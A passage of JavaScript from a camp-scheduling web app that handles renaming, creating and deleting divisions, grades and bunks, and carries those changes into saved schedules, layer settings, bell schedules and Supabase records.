        if(!nameEl.title)nameEl.title='Double-click to rename';
        nameEl.addEventListener('dblclick',function(ev){
            ev.stopPropagation();
            if(chip.querySelector('.me-bunk-rename-inp'))return;
            var cur=nameEl.textContent.trim();
            var inp=document.createElement('input');
            inp.type='text';inp.value=cur;inp.className='me-bunk-rename-inp';
            inp.style.cssText='width:96px;font:inherit;padding:0 2px;';
            chip.insertBefore(inp,nameEl);nameEl.style.display='none';inp.focus();inp.select();
            var done=false;
            function commit(keep){
                if(done)return;done=true;
                if(keep){var nv=(inp.value||'').trim();if(nv)nameEl.textContent=nv;} // data-orig stays = original
                nameEl.style.display='';if(inp.parentNode)inp.parentNode.removeChild(inp);
            }
            inp.addEventListener('blur',function(){commit(true)});
            inp.addEventListener('keydown',function(e){
                if(e.key==='Enter'){e.preventDefault();commit(true);}
                else if(e.key==='Escape'){e.preventDefault();commit(false);}
            });
        });
    }
}

// Division create/edit
function openDivForm(name){
    editingDiv=name;
    var d=name?structure[name]:{color:COLORS[Object.keys(structure).length%COLORS.length],grades:{}};
    document.getElementById('dmTitle').textContent=name?'Edit Division':'Add Division';
    var h=ff('Division Name','dmName',name||'');
    h+='<div class="fg"><label class="fl">Color</label><div class="swatch-row">';
    COLORS.forEach(function(c){h+='<button class="swatch'+(d.color===c?' sel':'')+'" style="background:'+c+'" data-color="'+c+'" onclick="CampistryMe._pickColor(this)"></button>'});
    h+='</div><input type="hidden" id="dmColor" value="'+(d.color||COLORS[0])+'"></div>';
    // Grades + Bunks
    h+='<div class="fsec">Grades & Bunks <span style="font-weight:400;color:var(--s400);font-size:.75rem">(drag the ⋮⋮ handle to reorder)</span></div><div id="dmGrades">';
    _sortedGrades(d).forEach(function([gn,gd]){
        h+=_renderGradeRowHTML(gn,gd.bunks||[],gd.daysPresent,gd.schoolGrades);
    });
    h+='</div><button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe._addGradeRow()">+ Add Grade</button>';
    document.getElementById('dmBody').innerHTML=h;
    var dmGrades=document.getElementById('dmGrades');
    _meReorderInit(dmGrades,'.dm-grade-row');
    dmGrades.querySelectorAll('.dm-grade-row').forEach(_wireGradeRow);
    document.getElementById('dmSave').onclick=saveDiv;
    openModal('divModal');
}
function _addGradeRow(){
    var cont=document.getElementById('dmGrades');
    var tmp=document.createElement('div');
    tmp.innerHTML=_renderGradeRowHTML('',[]);
    var row=tmp.firstChild;
    cont.appendChild(row);
    _wireGradeRow(row);
}
function _pickColor(el){
    document.querySelectorAll('.swatch').forEach(function(s){s.classList.remove('sel')});
    el.classList.add('sel');
    document.getElementById('dmColor').value=el.dataset.color;
}
function saveDiv(){
    var name=(document.getElementById('dmName').value||'').trim();
    if(!name){toast('Name required','error');return}
    // ★ Day 9 collision guard: creating a division with an existing name, or renaming one
    //   onto another, would OVERWRITE the existing division at structure[name] below
    //   (silent data loss — all its grades/bunks gone). Reject instead of clobbering.
    if(name!==editingDiv&&structure[name]){toast('A division named "'+name+'" already exists','error');return}
    var color=document.getElementById('dmColor').value||COLORS[0];
    // ★ Snapshot old bunks AND grades before applying changes so we can detect removals
    var oldBunks=[];var oldGrades=[];
    var srcDiv=editingDiv||name;
    if(structure[srcDiv]&&structure[srcDiv].grades){
        oldGrades=Object.keys(structure[srcDiv].grades);
        Object.values(structure[srcDiv].grades).forEach(function(g){(g.bunks||[]).forEach(function(b){oldBunks.push(b)})});
    }
    var grades={};
    // Iterate grade rows in DOM order so drag-reorder is preserved.
    var rows=document.querySelectorAll('#dmGrades .dm-grade-row');
    rows.forEach(function(row){
        var nameEl=row.querySelector('.dmGradeN');
        var gn=nameEl?nameEl.value.trim():'';
        if(!gn)return;
        var bunks=Array.prototype.map.call(row.querySelectorAll('.me-bunk-chip .me-bunk-name'),function(s){return s.textContent.trim()}).filter(Boolean);
        grades[gn]={bunks:bunks};
        // ★ Per-day presence: store the checked weekdays only when it's an actual
        //   restriction (fewer than all 7). All 7 = present every day → omit (clean +
        //   backward compatible). [] (none checked) IS stored → grade hidden every day.
        var _chips=row.querySelectorAll('.dm-day-chip');
        if(_chips.length){
            var _days=Array.prototype.map.call(_chips,function(c){return c.getAttribute('data-on')==='1'?c.getAttribute('data-day'):null}).filter(Boolean);
            if(_days.length<_chips.length)grades[gn].daysPresent=_days;
        }
        // Which real school grade(s) this bunk group is for — omitted entirely
        // when none are checked, so a camp that doesn't use this stays exactly
        // as before (autoGenerateBunks falls back to its old grade-name match).
        var _sgChips=Array.prototype.filter.call(row.querySelectorAll('.dm-sg-chip'),function(c){return c.getAttribute('data-on')==='1';}).map(function(c){return c.getAttribute('data-sg');});
        if(_sgChips.length)grades[gn].schoolGrades=_sgChips;
    });
    if(editingDiv&&editingDiv!==name){
        // Rename: update roster references AND propagate to schedule records
        Object.values(roster).forEach(function(c){if(c.division===editingDiv){c.division=name}});
        delete structure[editingDiv];
        // ★ v2: Propagate rename to in-memory + cloud schedules so divisionTimes
        //   keys, _division slot references, and any division-keyed sub-structures
        //   stay consistent. Silent staleness here previously caused UI/print/
        //   analytics paths to lose schedule data for the renamed division.
        _propagateDivisionRename(editingDiv, name);
    }
    // ★ FN-1: detect grade RENAMES (a row's data-orig differs from its new name) and
    //   PROPAGATE the old grade's setup to the new name — manual skeleton tiles, auto
    //   layers, schedule/divisionTimes keys (grades ARE the scheduling unit), and roster
    //   campers — instead of letting the old name fall through to removedGrades below,
    //   which silently DESTROYED that grade's skeleton/layers/times and stranded campers.
    var gradeRenameMap={};
    document.querySelectorAll('#dmGrades .dm-grade-row .dmGradeN').forEach(function(el){
        var orig=(el.dataset.orig||'').trim(), cur=(el.value||'').trim();
        if(orig&&cur&&orig!==cur&&oldGrades.indexOf(orig)!==-1&&(cur in grades))gradeRenameMap[orig]=cur;
    });
    Object.keys(gradeRenameMap).forEach(function(oldG){
        var newG=gradeRenameMap[oldG];
        _propagateDivisionRename(oldG,newG);      // scheduling-unit keys / slot _division / cloud
        _propagateGradeRenameTiles(oldG,newG);    // manual skeleton tiles + auto-layer config
        Object.values(roster).forEach(function(c){if(c&&c.grade===oldG)c.grade=newG});
    });
    var gradeOrder=[];
    rows.forEach(function(row){
        var gn=row.querySelector('.dmGradeN');
        var n=gn?gn.value.trim():'';
        if(n)gradeOrder.push(n);
    });
    structure[name]={color:color,grades:grades,gradeOrder:gradeOrder};
    save();closeModal('divModal');render(curPage);toast(editingDiv?'Division updated':'Division created');
    // ★ Purge orphaned bunks from saved AUTO schedules
    var newBunks=[];
    Object.values(grades).forEach(function(g){(g.bunks||[]).forEach(function(b){newBunks.push(b)})});
    // ★★★ CB-94: detect bunk RENAMES (a chip whose data-orig differs from its new
    //   text) and MIGRATE the bunk's schedules to the new name instead of letting
    //   the old name fall through to _purgeOrphanedBunks, which DESTROYED the old
    //   bunk's cloud schedule rows while the new name started empty. Mirrors the
    //   grade-rename handling above.
    var bunkRenameMap={};
    document.querySelectorAll('#dmGrades .dm-grade-row .me-bunk-chip .me-bunk-name').forEach(function(el){
        var orig=(el.dataset.orig||'').trim(), cur=(el.textContent||'').trim();
        if(orig&&cur&&orig!==cur&&oldBunks.indexOf(orig)!==-1&&oldBunks.indexOf(cur)===-1&&newBunks.indexOf(cur)!==-1){
            bunkRenameMap[orig]=cur;
        }
    });
    var _renamedOrigBunks=Object.keys(bunkRenameMap);
    _renamedOrigBunks.forEach(function(oldB){ _propagateBunkRename(oldB, bunkRenameMap[oldB]); });
    // Keep roster[name].bunk in sync with the rename too — mirrors the
    // grade-rename handling above (Object.values(roster)...c.grade===oldG).
    // Without this, a renamed bunk left every camper placed in it pointing at
    // a bunk name that no longer exists in Camp Structure, silently vanishing
    // them from Bunk Builder (no longer "unassigned", but no longer matching
    // any real bunk either) and showing the stale name in Campistry Link.
    if(Object.keys(bunkRenameMap).length){
        Object.values(roster).forEach(function(c){ if(c&&bunkRenameMap[c.bunk])c.bunk=bunkRenameMap[c.bunk]; });
    }
    var removed=oldBunks.filter(function(b){return newBunks.indexOf(b)===-1 && _renamedOrigBunks.indexOf(b)===-1;});
    if(removed.length>0){
        _purgeOrphanedBunks(removed);
        // A camper whose bunk was deleted outright (not renamed) goes back to
        // Unassigned rather than being permanently stranded on a bunk name
        // that no longer exists anywhere in the structure.
        Object.values(roster).forEach(function(c){ if(c&&removed.indexOf(c.bunk)!==-1)c.bunk=''; });
    }
    if(Object.keys(bunkRenameMap).length||removed.length>0){save();render(curPage);}
    // ★ Day 9 (manual-builder parity): purge removed scheduling-unit (grade) tiles from
    //   the saved MANUAL skeletons too — previously only the auto schedule was cleaned.
    var removedGrades=oldGrades.filter(function(g){return !(g in grades)&&!(g in gradeRenameMap)});
    if(removedGrades.length>0){_purgeOrphanedSkeletonTiles(removedGrades);_purgeOrphanedAutoLayers(removedGrades);_purgeOrphanedCampPeriods(removedGrades);/* ★ CB-102/105 */}
}
async function deleteDiv(n){
    var ok=await confirmDialog({title:'Delete Division?',message:'<strong>'+esc(n)+'</strong> and all its grades and bunks will be deleted. Campers in it become unassigned.',confirmLabel:'Delete',danger:true});
    if(!ok)return;
    // ★ Collect all bunks AND grades from this division before deleting
    var removedBunks=[];var removedGrades=[];
    if(structure[n]&&structure[n].grades){
        removedGrades=Object.keys(structure[n].grades);
        Object.values(structure[n].grades).forEach(function(g){(g.bunks||[]).forEach(function(b){removedBunks.push(b)})});
    }
    delete structure[n];Object.values(roster).forEach(function(c){if(c.division===n){c.division='';c.grade='';c.bunk=''}});save();render(curPage);toast('Deleted');
    // ★ Purge orphaned bunks from saved AUTO schedules + orphaned grade tiles from MANUAL skeletons
    if(removedBunks.length>0)_purgeOrphanedBunks(removedBunks);
    if(removedGrades.length>0){_purgeOrphanedSkeletonTiles(removedGrades);_purgeOrphanedAutoLayers(removedGrades);_purgeOrphanedCampPeriods(removedGrades);/* ★ CB-102/105 */}
}
// ★ Day 9 (manual-builder parity for the structure-change cascade): the auto schedule
//   is cleaned by _purgeOrphanedBunks, but the saved MANUAL skeletons (app1.dailySkeletons
//   in the cloud blob + campManualSkeleton_<date> locally) were never cleaned when a
//   scheduling-unit (grade) was removed — so orphan tiles (e.g. division "4" from an old
//   structure) accumulated across dates. Prune tiles referencing EXACTLY the removed grade
//   names (scoped to explicit removals, so surviving grades' tiles are never touched).
function _purgeOrphanedSkeletonTiles(removedGrades){
    if(!removedGrades||!removedGrades.length)return;
    var rm={};removedGrades.forEach(function(g){rm[g]=1});
    try{
        var gs=window.loadGlobalSettings&&window.loadGlobalSettings();
        var app1=gs&&gs.app1;
        if(!app1||!app1.dailySkeletons){return}
        var changed=false,prunedCount=0;
        Object.keys(app1.dailySkeletons).forEach(function(date){
            var tiles=app1.dailySkeletons[date];
            if(!Array.isArray(tiles))return;
            var kept=tiles.filter(function(t){return !(t&&rm[t.division])});
            if(kept.length!==tiles.length){prunedCount+=(tiles.length-kept.length);app1.dailySkeletons[date]=kept;changed=true}
            // mirror to the local per-date key if present
            try{var lk='campManualSkeleton_'+date,raw=localStorage.getItem(lk);if(raw){var lt=JSON.parse(raw);if(Array.isArray(lt)){var lkept=lt.filter(function(t){return !(t&&rm[t.division])});if(lkept.length!==lt.length)localStorage.setItem(lk,JSON.stringify(lkept))}}}catch(_){}
        });
        if(changed&&typeof window.saveGlobalSettings==='function'){
            window.saveGlobalSettings('app1',app1);
            if(typeof window.forceSyncToCloud==='function'){try{window.forceSyncToCloud()}catch(_){}}
            console.log('[Me] Pruned',prunedCount,'orphaned manual-skeleton tile(s) for removed grade(s):',removedGrades);
        }
    }catch(e){console.warn('[Me] _purgeOrphanedSkeletonTiles:',e)}
}
// ★ Day 14 (auto-builder parity for the structure-change cascade): the AUTO layer config
//   — app1.dailyAutoLayers (per-date, keyed by grade) + app1.gradeLayerRules (keyed by
//   grade) — was never cleaned when a scheduling-unit (grade) was removed, so layer configs
//   for deleted grades accumulated across dates (the auto analog of the manual skeleton
//   orphans). Drop entries for EXACTLY the removed grade names (scoped, so surviving grades
//   are untouched). Mirrors _purgeOrphanedSkeletonTiles.
function _purgeOrphanedAutoLayers(removedGrades){
    if(!removedGrades||!removedGrades.length)return;
    try{
        var gs=window.loadGlobalSettings&&window.loadGlobalSettings();
        var app1=gs&&gs.app1; if(!app1)return;
        var changed=false,prunedCount=0;
        // dailyAutoLayers: date -> { grade -> layerConfig }
        if(app1.dailyAutoLayers&&typeof app1.dailyAutoLayers==='object'){
            Object.keys(app1.dailyAutoLayers).forEach(function(date){
                var byGrade=app1.dailyAutoLayers[date];
                if(byGrade&&typeof byGrade==='object'&&!Array.isArray(byGrade)){
                    removedGrades.forEach(function(g){ if(g in byGrade){delete byGrade[g];changed=true;prunedCount++} });
                }
            });
        }
        // gradeLayerRules: grade -> rules
        if(app1.gradeLayerRules&&typeof app1.gradeLayerRules==='object'){
            removedGrades.forEach(function(g){ if(g in app1.gradeLayerRules){delete app1.gradeLayerRules[g];changed=true;prunedCount++} });
        }
        if(changed&&typeof window.saveGlobalSettings==='function'){
            window.saveGlobalSettings('app1',app1);
            if(typeof window.forceSyncToCloud==='function'){try{window.forceSyncToCloud()}catch(_){}}
            console.log('[Me] Pruned',prunedCount,'orphaned auto-layer entr(ies) for removed grade(s):',removedGrades);
        }
    }catch(e){console.warn('[Me] _purgeOrphanedAutoLayers:',e)}
}
// ★ FN-1: Propagate a GRADE rename to the saved manual skeletons + auto-layer config.
//   Mirrors _purgeOrphanedSkeletonTiles / _purgeOrphanedAutoLayers but RENAMES (oldG→newG)
//   instead of deleting, so a grade rename keeps its skeleton tiles, dailyAutoLayers entry,
//   and gradeLayerRules entry. (Schedule/divisionTimes/slot keys are handled by
//   _propagateDivisionRename since grades are the scheduling unit; campers by the saveDiv loop.)
function _propagateGradeRenameTiles(oldG, newG){
    if(!oldG||!newG||oldG===newG)return;
    try{
        var gs=window.loadGlobalSettings&&window.loadGlobalSettings();
        var app1=gs&&gs.app1; if(!app1)return;
        var changed=false;
        // manual skeleton tiles: tile.division === oldG → newG (cloud blob + local per-date mirror)
        if(app1.dailySkeletons&&typeof app1.dailySkeletons==='object'){
            Object.keys(app1.dailySkeletons).forEach(function(date){
                var tiles=app1.dailySkeletons[date]; if(!Array.isArray(tiles))return;
                tiles.forEach(function(t){if(t&&t.division===oldG){t.division=newG;changed=true}});
                try{var lk='campManualSkeleton_'+date,raw=localStorage.getItem(lk);if(raw){var lt=JSON.parse(raw);if(Array.isArray(lt)){var lc=false;lt.forEach(function(t){if(t&&t.division===oldG){t.division=newG;lc=true}});if(lc)localStorage.setItem(lk,JSON.stringify(lt))}}}catch(_){}
            });
        }
        // auto layers: dailyAutoLayers[date][oldG] → [newG]
        if(app1.dailyAutoLayers&&typeof app1.dailyAutoLayers==='object'){
            Object.keys(app1.dailyAutoLayers).forEach(function(date){
                var bg=app1.dailyAutoLayers[date];
                if(bg&&typeof bg==='object'&&!Array.isArray(bg)&&(oldG in bg)&&!(newG in bg)){bg[newG]=bg[oldG];delete bg[oldG];changed=true}
            });
        }
        // gradeLayerRules[oldG] → [newG]
        if(app1.gradeLayerRules&&typeof app1.gradeLayerRules==='object'&&(oldG in app1.gradeLayerRules)&&!(newG in app1.gradeLayerRules)){
            app1.gradeLayerRules[newG]=app1.gradeLayerRules[oldG];delete app1.gradeLayerRules[oldG];changed=true;
        }
        // ★★★ CB-93: autoLayerTemplates[tmpl][oldG] → [newG]. The auto-layer editor
        // store (master_schedule_builder dawLayers) persists into
        // app1.autoLayerTemplates, GRADE-keyed inside each template, and
        // loadDAWLayers reads EXCLUSIVELY from there — so a grade rename previously
        // left the renamed grade opening with an EMPTY layer editor and its
        // configured layers orphaned (a delete lost them forever). Rename the grade
        // key inside every template.
        if(app1.autoLayerTemplates&&typeof app1.autoLayerTemplates==='object'){
            Object.keys(app1.autoLayerTemplates).forEach(function(tmpl){
                var byGrade=app1.autoLayerTemplates[tmpl];
                if(byGrade&&typeof byGrade==='object'&&!Array.isArray(byGrade)&&(oldG in byGrade)&&!(newG in byGrade)){
                    byGrade[newG]=byGrade[oldG];delete byGrade[oldG];changed=true;
                }
            });
        }
        // ★★★ CB-83/CB-85: migrate the grade rename into special-activity per-grade
        // config. The special validator filters every per-grade list against the
        // CURRENT grade set, so a rename (which never touched specials) made it
        // silently PRUNE the now-orphaned grade from sharing divisions, access
        // restrictions + priority list, rotation cohort and the per-grade
        // full-grade map. Rename oldG → newG in each (guarded so absent grades
        // don't force a needless save).
        if(Array.isArray(app1.specialActivities)){
            app1.specialActivities.forEach(function(sp){
                if(!sp||typeof sp!=='object')return;
                if(sp.sharableWith&&Array.isArray(sp.sharableWith.divisions)&&sp.sharableWith.divisions.indexOf(oldG)!==-1){
                    sp.sharableWith.divisions=sp.sharableWith.divisions.map(function(d){return d===oldG?newG:d});changed=true;
                }
                var ar=sp.accessRestrictions;
                if(ar&&typeof ar==='object'){
                    if(ar.divisions&&typeof ar.divisions==='object'&&(oldG in ar.divisions)&&!(newG in ar.divisions)){
                        ar.divisions[newG]=ar.divisions[oldG];delete ar.divisions[oldG];changed=true;
                    }
                    if(Array.isArray(ar.priorityList)&&ar.priorityList.indexOf(oldG)!==-1){
                        ar.priorityList=ar.priorityList.map(function(d){return d===oldG?newG:d});changed=true;
                    }
                }
                if(sp.rotationCohort&&Array.isArray(sp.rotationCohort.grades)&&sp.rotationCohort.grades.indexOf(oldG)!==-1){
                    sp.rotationCohort.grades=sp.rotationCohort.grades.map(function(d){return d===oldG?newG:d});changed=true;
                }
                if(sp.fullGradePerGrade&&typeof sp.fullGradePerGrade==='object'&&(oldG in sp.fullGradePerGrade)&&!(newG in sp.fullGradePerGrade)){
                    sp.fullGradePerGrade[newG]=sp.fullGradePerGrade[oldG];delete sp.fullGradePerGrade[oldG];changed=true;
                }
            });
        }
        if(changed&&typeof window.saveGlobalSettings==='function'){
            window.saveGlobalSettings('app1',app1);
            if(typeof window.forceSyncToCloud==='function'){try{window.forceSyncToCloud()}catch(_){}}
            console.log('[Me] Propagated grade rename in skeletons/auto-layers/specials:',oldG,'→',newG);
        }
        // ★★★ CB-102/CB-105: migrate the Bell Schedule (campPeriods) on grade rename. campPeriods is
        // a TOP-LEVEL grade-keyed global setting (gs.campPeriods[grade]) — NOT under app1 — read by the
        // auto solver, day_packer, master_schedule_builder, daily_adjustments + print_center. This
        // cascade renamed skeletons/auto-layers/specials but never campPeriods, so a renamed grade lost
        // its custom periods (fell back to defaults) and the old key orphaned in cloud config. Own save
        // (separate key from the app1 block above).
        try{
            var cp=gs&&gs.campPeriods;
            if(cp&&typeof cp==='object'&&(oldG in cp)&&!(newG in cp)){
                cp[newG]=cp[oldG];delete cp[oldG];
                try{if(window.campPeriods&&typeof window.campPeriods==='object'&&(oldG in window.campPeriods)&&!(newG in window.campPeriods)){window.campPeriods[newG]=window.campPeriods[oldG];delete window.campPeriods[oldG]}}catch(_){}
                if(typeof window.saveGlobalSettings==='function'){
                    window.saveGlobalSettings('campPeriods',cp);
                    if(typeof window.forceSyncToCloud==='function'){try{window.forceSyncToCloud()}catch(_){}}
                }
                console.log('[Me] CB-102/105: migrated campPeriods (Bell Schedule) on grade rename:',oldG,'→',newG);
            }
        }catch(_cpErr){console.warn('[Me] campPeriods rename:',_cpErr)}
    }catch(e){console.warn('[Me] _propagateGradeRenameTiles:',e)}
}
// ★★★ CB-102/CB-105: purge the Bell Schedule (campPeriods) for removed grades. Sibling of
//   _purgeOrphanedAutoLayers — campPeriods is a top-level grade-keyed key, so it gets its own
//   load/save. Without this, deleting a grade left its periods orphaned under the old key in cloud.
function _purgeOrphanedCampPeriods(removedGrades){
    if(!removedGrades||!removedGrades.length)return;
    try{
        var gs=window.loadGlobalSettings&&window.loadGlobalSettings();
        var cp=gs&&gs.campPeriods; if(!cp||typeof cp!=='object')return;
        var changed=false;
        removedGrades.forEach(function(g){
            if(g in cp){delete cp[g];changed=true}
            try{if(window.campPeriods&&(g in window.campPeriods))delete window.campPeriods[g]}catch(_){}
        });
        if(changed&&typeof window.saveGlobalSettings==='function'){
            window.saveGlobalSettings('campPeriods',cp);
            if(typeof window.forceSyncToCloud==='function'){try{window.forceSyncToCloud()}catch(_){}}
            console.log('[Me] CB-102/105: purged orphaned campPeriods (Bell Schedule) for removed grade(s):',removedGrades);
        }
    }catch(e){console.warn('[Me] _purgeOrphanedCampPeriods:',e)}
}
// ★ Propagate a division rename to all schedule references.
//   Renames in-memory divisionTimes / unifiedTimes keys, rewrites _division
//   fields in slot entries, and updates cloud daily_schedules records.
function _propagateDivisionRename(oldName, newName){
    if(!oldName||!newName||oldName===newName)return;
    console.log('[Me] Propagating division rename:',oldName,'→',newName);
    // 1. In-memory rename — divisionTimes, unifiedTimes, divisions, availableDivisions
    function _renameKey(obj){
        if(!obj||typeof obj!=='object'||Array.isArray(obj))return;
        if(oldName in obj){obj[newName]=obj[oldName];delete obj[oldName]}
    }
    _renameKey(window.divisionTimes);
    _renameKey(window.unifiedTimes);
    _renameKey(window.divisions);
    if(Array.isArray(window.availableDivisions)){
        var idx=window.availableDivisions.indexOf(oldName);
        if(idx>=0)window.availableDivisions[idx]=newName;
    }
    // 2. Rewrite _division field on every slot in current scheduleAssignments
    if(window.scheduleAssignments){
        Object.values(window.scheduleAssignments).forEach(function(slots){
            if(!Array.isArray(slots))return;
            slots.forEach(function(s){
                if(s&&s._division===oldName)s._division=newName;
            });
        });
    }
    // 4. ★★★ CB-92: propagate to the RBAC scheduler-scoping stores so a scheduler
    //    scoped to the renamed unit BY NAME doesn't silently lose access on their
    //    next login. The rename is owner-initiated (Me page), so the owner may
    //    write these rows. subdivisions.divisions[] and camp_users.assigned_divisions[]
    //    both store division/grade NAMES. Best-effort + non-fatal (a failure must
    //    not block the rename). [LIVE] — needs a 2-account verify.
    try{
        var _rbClient=(window.CampistryDB&&window.CampistryDB.getClient)?window.CampistryDB.getClient():window.supabase;
        var _rbCamp=(window.CampistryDB&&window.CampistryDB.getCampId)?window.CampistryDB.getCampId():(window.getCampId?window.getCampId():null);
        if(_rbClient&&_rbCamp){
            _rbClient.from('subdivisions').select('id,divisions').eq('camp_id',_rbCamp).then(function(res){
                if(res.error||!res.data)return;
                res.data.forEach(function(row){
                    if(!Array.isArray(row.divisions)||row.divisions.indexOf(oldName)===-1)return;
                    var nd=row.divisions.map(function(d){return d===oldName?newName:d});
                    _rbClient.from('subdivisions').update({divisions:nd}).eq('id',row.id).then(function(r){if(r.error)console.error('[Me] CB-92 subdivision rename failed',row.id,r.error);});
                });
            }).catch(function(e){console.warn('[Me] CB-92 subdivisions migrate failed:',e);});
            _rbClient.from('camp_users').select('user_id,assigned_divisions').eq('camp_id',_rbCamp).then(function(res){
                if(res.error||!res.data)return;
                res.data.forEach(function(row){
                    if(!Array.isArray(row.assigned_divisions)||row.assigned_divisions.indexOf(oldName)===-1)return;
                    var nd=row.assigned_divisions.map(function(d){return d===oldName?newName:d});
                    _rbClient.from('camp_users').update({assigned_divisions:nd}).eq('camp_id',_rbCamp).eq('user_id',row.user_id).then(function(r){if(r.error)console.error('[Me] CB-92 camp_users rename failed',row.user_id,r.error);});
                });
            }).catch(function(e){console.warn('[Me] CB-92 camp_users migrate failed:',e);});
        }
    }catch(_eRb){console.warn('[Me] CB-92 RBAC rename propagate exception:',_eRb);}

    // 3. Propagate to cloud daily_schedules
    function _toast(msg, kind){
        try{
            if(typeof window.showToast==='function')window.showToast(msg, kind||'info');
            else if(typeof window.toast==='function')window.toast(msg, kind||'info');
        }catch(_){}
    }
    function _retry(fn, label){
        var attempt=0, max=3;
        function tryOnce(){
            attempt++;
            return fn().catch(function(err){
                if(attempt>=max)throw err;
                return new Promise(function(r){setTimeout(r, Math.pow(2,attempt-1)*500)}).then(tryOnce);
            });
        }
        return tryOnce();
    }
    try{
        var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():window.supabase;
        var campId=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():(window.getCampId?window.getCampId():null);
        if(!client||!campId){
            _toast('⚠️ Division renamed locally but cloud schedules not updated (DB unavailable).','warning');
            return;
        }
        _retry(function(){
            return client.from('daily_schedules').select('id,schedule_data').eq('camp_id',campId)
                .then(function(r){if(r.error)throw r.error;return r.data||[]});
        },'fetch').then(function(records){
            var updates=[];
            records.forEach(function(record){
                var sd=record.schedule_data||{};
                var modified=false;
                // Rename division-keyed sub-structures.
                // ★★★ CB-82: include _perBunkSlotsData — cloud schedule_data carries
                // a top-level division/grade-keyed _perBunkSlotsData (the auto-mode
                // per-bunk slot geometry, consumed on load by MS-4c). The rename
                // previously migrated only divisionTimes/unifiedTimes, orphaning the
                // renamed unit's per-bunk geometry on every saved date.
                ['divisionTimes','unifiedTimes','_perBunkSlotsData'].forEach(function(k){
                    if(sd[k]&&typeof sd[k]==='object'&&oldName in sd[k]){
                        sd[k]=Object.assign({},sd[k]);
                        sd[k][newName]=sd[k][oldName];
                        delete sd[k][oldName];
                        modified=true;
                    }
                });
                // Rewrite _division refs in each slot
                if(sd.scheduleAssignments&&typeof sd.scheduleAssignments==='object'){
                    var newSa=Object.assign({},sd.scheduleAssignments);
                    Object.keys(newSa).forEach(function(bunk){
                        var slots=newSa[bunk];
                        if(!Array.isArray(slots))return;
                        var slotChanged=false;
                        var newSlots=slots.map(function(s){
                            if(s&&s._division===oldName){slotChanged=true;return Object.assign({},s,{_division:newName})}
                            return s;
                        });
                        if(slotChanged){newSa[bunk]=newSlots;modified=true}
                    });
                    if(modified)sd.scheduleAssignments=newSa;
                }
                if(modified){
                    updates.push(_retry(function(){
                        return client.from('daily_schedules')
                            .update({schedule_data:sd,updated_at:new Date().toISOString()})
                            .eq('id',record.id)
                            .then(function(r){if(r.error)throw r.error;return r});
                    },'update '+record.id));
                }
            });
            if(updates.length===0){
                console.log('[Me] No schedule records referenced the renamed division');
                return;
            }
            return Promise.allSettled(updates).then(function(results){
                var failed=results.filter(function(r){return r.status==='rejected'});
                var ok=results.length-failed.length;
                if(failed.length===0){
                    console.log('[Me] ✅ Renamed division in',ok,'schedule records');
                }else{
                    console.error('[Me] ❌ Division rename had',failed.length,'failures:',failed);
                    _toast('⚠️ Division renamed but '+failed.length+' schedule record(s) failed. Some old data may persist.','warning');
                }
            });
        }).catch(function(err){
            console.error('[Me] Division rename propagation failed:',err);
            _toast('⚠️ Division renamed locally but cloud propagation failed: '+(err.message||err),'error');
        });
    }catch(e){
        console.error('[Me] Division rename exception:',e);
        _toast('⚠️ Division renamed but cloud cleanup hit an error.','error');
    }
}

// ★ Remove orphaned bunk data from all saved schedule records.
//   When a bunk is removed from camp structure, its schedule data becomes
//   invisible to the UI but persists in Supabase. This cleans it up.
//   v2: Adds retry-on-failure (3 attempts) and surfaces failures via toast
//       so silent network errors don't leave orphan data in the cloud.
function _purgeOrphanedBunks(removedBunks){
    if(!removedBunks||removedBunks.length===0)return;
    console.log('[Me] Purging',removedBunks.length,'orphaned bunks from schedules:',removedBunks);
    // 1. Clean from in-memory schedule (current session)
    if(window.scheduleAssignments){
        removedBunks.forEach(function(b){delete window.scheduleAssignments[b]});
    }
    if(window.scheduleSegments){
        removedBunks.forEach(function(b){delete window.scheduleSegments[b]});
    }
    // Local toast helper (no-op if Campistry's toast helper isn't loaded)
    function _toast(msg, kind){
        try{
            if(typeof window.showToast==='function')window.showToast(msg, kind||'info');
            else if(typeof window.toast==='function')window.toast(msg, kind||'info');
        }catch(_){}
    }
    // Retry helper with exponential backoff (max 3 attempts)
    function _retryWithBackoff(fn, label){
        var attempt=0, maxAttempts=3;
        function tryOnce(){
            attempt++;
            return fn().catch(function(err){
                if(attempt>=maxAttempts)throw err;
                var delay=Math.pow(2, attempt-1)*500; // 500ms, 1s, 2s
                console.warn('[Me] '+label+' attempt '+attempt+' failed, retrying in '+delay+'ms:',err);
                return new Promise(function(resolve){setTimeout(resolve, delay)}).then(tryOnce);
            });
        }
        return tryOnce();
    }
    // 2. Clean from all cloud schedule records (async, with retry + toast on failure)
    try{
        var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():window.supabase;
        var campId=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():(window.getCampId?window.getCampId():null);
        if(!client||!campId){
            console.warn('[Me] Cannot purge cloud — DB not available');
            _toast('⚠️ Removed bunk locally but could not clean cloud data (DB unavailable). Refresh to retry.','warning');
            return;
        }
        _retryWithBackoff(function(){
            return client.from('daily_schedules').select('id,schedule_data').eq('camp_id',campId)
                .then(function(res){
                    if(res.error)throw res.error;
                    return res.data||[];
                });
        },'fetch').then(function(records){
            var updates=[];
            records.forEach(function(record){
                var sd=record.schedule_data||{};
                var sa=Object.assign({},sd.scheduleAssignments||{});
                var la=Object.assign({},sd.leagueAssignments||{});
                var modified=false;
                removedBunks.forEach(function(b){
                    if(sa[b]!==undefined){delete sa[b];modified=true}
                    if(la[b]!==undefined){delete la[b];modified=true}
                });
                if(modified){
                    updates.push(_retryWithBackoff(function(){
                        return client.from('daily_schedules')
                            .update({schedule_data:Object.assign({},sd,{scheduleAssignments:sa,leagueAssignments:la}),updated_at:new Date().toISOString()})
                            .eq('id',record.id)
                            .then(function(r){if(r.error)throw r.error;return r});
                    },'update '+record.id));
                }
            });
            if(updates.length===0){
                console.log('[Me] No schedule records contained orphaned bunks');
                return;
            }
            // Use allSettled so one bad record doesn't kill the rest
            return Promise.allSettled(updates).then(function(results){
                var failed=results.filter(function(r){return r.status==='rejected'});
                var ok=results.length-failed.length;
                if(failed.length===0){
                    console.log('[Me] ✅ Purged orphaned bunks from',ok,'schedule records');
                }else{
                    console.error('[Me] ❌ Purge had',failed.length,'failures (',ok,'succeeded):',failed);
